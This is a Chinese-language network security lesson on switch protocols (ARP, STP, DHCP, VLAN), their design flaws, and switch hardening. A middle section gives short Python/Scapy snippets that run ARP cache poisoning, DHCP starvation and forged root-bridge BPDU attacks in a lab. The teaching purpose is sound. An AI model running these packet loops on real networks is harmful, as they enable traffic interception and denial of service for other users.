![](img/eb88a2608f50558dd3ae5eca5a7be902_0.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_1.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_3.png)

# 课程P1：带你探索交换机的秘密 🔍

在本课程中，我们将学习交换机的基本工作原理、底层网络协议的设计缺陷，以及如何利用这些缺陷进行渗透测试。课程内容涵盖从基础概念到实战演示，旨在帮助初学者理解网络安全的底层逻辑。

![](img/eb88a2608f50558dd3ae5eca5a7be902_5.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_7.png)

---

## 概述 📋

![](img/eb88a2608f50558dd3ae5eca5a7be902_9.png)

本节课程将介绍交换机在网络中的作用，并探讨其支持的基本协议。我们将从交换机和集线器的区别开始，逐步深入到网络协议的设计层面。

---

## 交换机支持的基本协议介绍 🔌

上一节我们概述了课程内容，本节中我们来看看交换机支持哪些基本协议。

交换机是连接网络中各个节点、客户端及网络设备的工具。在交换机出现之前，集线器（Hub）承担着类似的连接功能。然而，集线器采用广播方式传输数据，任何连接到集线器的设备都能看到整个网络内的通信数据，存在严重的安全风险。相比之下，交换机通过学习设备的MAC地址并建立MAC地址表，能够实现数据的定向转发，从而提高了网络的安全性和效率。

以下是交换机支持的几个核心协议：

1.  **ARP协议**：地址解析协议，用于将IP地址解析为MAC地址，以便在数据链路层进行通信。
2.  **STP协议**：生成树协议，用于消除网络中的环路，防止广播风暴，并在活动链路故障时启用备份链路。
3.  **DHCP协议**：动态主机配置协议，用于自动为网络中的设备分配IP地址及其他网络参数。
4.  **VLAN技术**：虚拟局域网，用于在物理网络设备上划分出多个逻辑子网，实现网络隔离。

---

## 底层网络协议设计存在的缺陷 ⚠️

![](img/eb88a2608f50558dd3ae5eca5a7be902_11.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_13.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_14.png)

了解了交换机的基本协议后，本节我们将探讨这些协议在设计上可能存在的安全缺陷。

![](img/eb88a2608f50558dd3ae5eca5a7be902_16.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_18.png)

网络协议在设计时往往优先考虑功能实现和通信效率，有时会忽略安全因素，从而留下可被利用的漏洞。

以下是几种常见的协议设计缺陷及对应的攻击方式：

![](img/eb88a2608f50558dd3ae5eca5a7be902_20.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_22.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_23.png)

*   **ARP欺骗攻击**：攻击者通过发送伪造的ARP应答包，篡改目标设备的ARP缓存表，使其将数据发送到错误的MAC地址，从而实现中间人攻击或拒绝服务。
    *   **攻击原理**：`攻击者发送：IP 1.1.1.2 对应 MAC 为 攻击者MAC`。
*   **VLAN设计缺陷**：
    *   **双标签跳跃攻击**：攻击者构造带有两层VLAN标签的数据包。接入交换机剥离外层标签后，内层标签会使数据包被转发到其他VLAN，实现跨VLAN访问（通常为单向）。
    *   **DTP协议攻击**：利用思科私有协议DTP，攻击者可以发送协商报文，将交换机的接入端口（Access Port）欺骗为干道端口（Trunk Port），从而接收所有VLAN的数据。
*   **STP协议攻击**：攻击者构造并发送优先级最高的BPDU报文，宣称自己为根桥，从而破坏整个生成树拓扑，导致网络环路或通信中断。
*   **DHCP协议攻击**：
    *   **DHCP服务器仿冒**：在网络中部署恶意DHCP服务器，为客户端分配错误的IP和网关，引导流量经过攻击者。
    *   **DHCP耗尽攻击**：攻击者通过伪造大量DHCP请求，快速耗尽DHCP地址池中的IP地址，导致合法用户无法获取IP。
*   **MAC地址泛洪攻击**：攻击者向交换机端口发送大量源MAC地址随机的数据帧，填满交换机的MAC地址表。导致交换机无法学习新地址，退化为集线器模式，向所有端口广播数据，从而实现嗅探。

![](img/eb88a2608f50558dd3ae5eca5a7be902_25.png)

---

![](img/eb88a2608f50558dd3ae5eca5a7be902_27.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_29.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_31.png)

## 使用Python对交换机进行渗透测试 🐍

认识了协议缺陷后，本节我们将使用Python的Scapy库，通过构造特定的数据包来演示如何利用这些缺陷进行渗透测试。

![](img/eb88a2608f50558dd3ae5eca5a7be902_33.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_35.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_37.png)

Scapy是一个强大的交互式数据包处理工具，可以用于构造、发送、捕获和分析网络数据包。

![](img/eb88a2608f50558dd3ae5eca5a7be902_39.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_41.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_43.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_45.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_46.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_48.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_49.png)

以下是几个实战演示的要点：

1.  **构造ARP请求包**：使用Scapy构造一个标准的ARP请求包，并发送到网络，验证通信是否正常。
    ```python
    from scapy.all import *
    # 构造以太网帧和ARP请求
    eth = Ether(dst="ff:ff:ff:ff:ff:ff", src="00:50:56:11:22:33", type=0x0806)
    arp = ARP(op=1, hwsrc="00:50:56:11:22:33", psrc="1.1.1.1", hwdst="ff:ff:ff:ff:ff:ff", pdst="1.1.1.2")
    packet = eth/arp
    sendp(packet, iface="VMnet8")
    ```
2.  **实施ARP欺骗攻击**：构造虚假的ARP应答包，持续发送以污染目标主机的ARP缓存。
    ```python
    # 构造虚假ARP应答，声称1.1.1.2的MAC是攻击者的MAC
    arp_poison = ARP(op=2, hwsrc="攻击者MAC", psrc="1.1.1.2", hwdst="目标MAC", pdst="1.1.1.1")
    sendp(eth/arp_poison, iface="VMnet8", loop=1, inter=0.5)
    ```
3.  **实施DHCP耗尽攻击**：伪造大量带有随机MAC地址的DHCP Discover报文，耗尽DHCP服务器地址池。
    ```python
    # 构造DHCP Discover包（简化示例）
    dhcp_discover = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / \
                    IP(src="0.0.0.0", dst="255.255.255.255") / \
                    UDP(sport=68, dport=67) / \
                    BOOTP(chaddr=RandString(12, '0123456789abcdef')) / \
                    DHCP(options=[("message-type", "discover"), "end"])
    sendp(dhcp_discover, iface="VMnet8", loop=1)
    ```
4.  **实施STP协议攻击**：构造声称自己是根桥的BPDU报文，破坏网络生成树拓扑。
    ```python
    # 构造恶意BPDU报文（简化概念）
    stp_packet = Ether(dst="01:80:c2:00:00:00", src="00:00:00:00:00:01") / \
                 LLC() / \
                 STP(rootid=0, rootmac="00:00:00:00:00:01", bridgeid=0, bridgemac="00:00:00:00:00:01")
    sendp(stp_packet, iface="VMnet8", loop=1, inter=0.1)
    ```

![](img/eb88a2608f50558dd3ae5eca5a7be902_51.png)

---

![](img/eb88a2608f50558dd3ae5eca5a7be902_53.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_55.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_57.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_59.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_61.png)

## 如何避免漏洞的产生 🛡️

![](img/eb88a2608f50558dd3ae5eca5a7be902_63.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_65.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_67.png)

在学习了攻击方法后，本节我们来看看如何通过配置交换机来防御上述攻击，加固网络安全。

防御的核心思路是启用交换机的安全特性，对异常协议行为进行检测和限制。

![](img/eb88a2608f50558dd3ae5eca5a7be902_69.png)

以下是针对不同攻击的防御建议：

*   **防御ARP攻击**：
    *   启用**ARP表项固化**，防止ARP表被恶意更新。
    *   启用**ARP防网关冲突**、**ARP严格学习**等功能。
    *   配置**DHCP Snooping**，并建立信任关系，只允许信任端口响应DHCP请求。
*   **防御STP攻击**：
    *   在接入端口启用**BPDU保护**，一旦收到BPDU报文则关闭端口。
    *   启用**根保护**，防止接入端口成为根端口。
    *   启用**环路保护**或**TC保护**。
*   **防御DHCP攻击**：
    *   全局启用**DHCP Snooping**功能。
    *   将连接合法DHCP服务器的端口设置为**信任端口**。
    *   在非信任端口**限制DHCP报文速率**。
    *   限制接口允许学习的DHCP用户数量。
*   **防御MAC地址泛洪**：
    *   在端口上启用**端口安全**，限制端口学习的最大MAC地址数量。
    *   配置违规后的处理动作为**关闭端口**或**限制转发**。

---

## 总结 🎯

在本节课中，我们一起学习了交换机的基础知识、底层网络协议（如ARP、STP、DHCP、VLAN）的工作原理及其设计缺陷。我们通过Python和Scapy库演示了如何利用这些缺陷进行ARP欺骗、DHCP耗尽、STP破坏等渗透测试。最后，我们探讨了如何在交换机上配置安全功能（如ARP表项固化、DHCP Snooping、BPDU保护、端口安全等）来有效防御这些攻击，提升网络的安全性。

![](img/eb88a2608f50558dd3ae5eca5a7be902_71.png)

![](img/eb88a2608f50558dd3ae5eca5a7be902_73.png)

理解这些底层原理和攻防技术，对于进行深入的内网渗透测试和构建更安全的网络环境至关重要。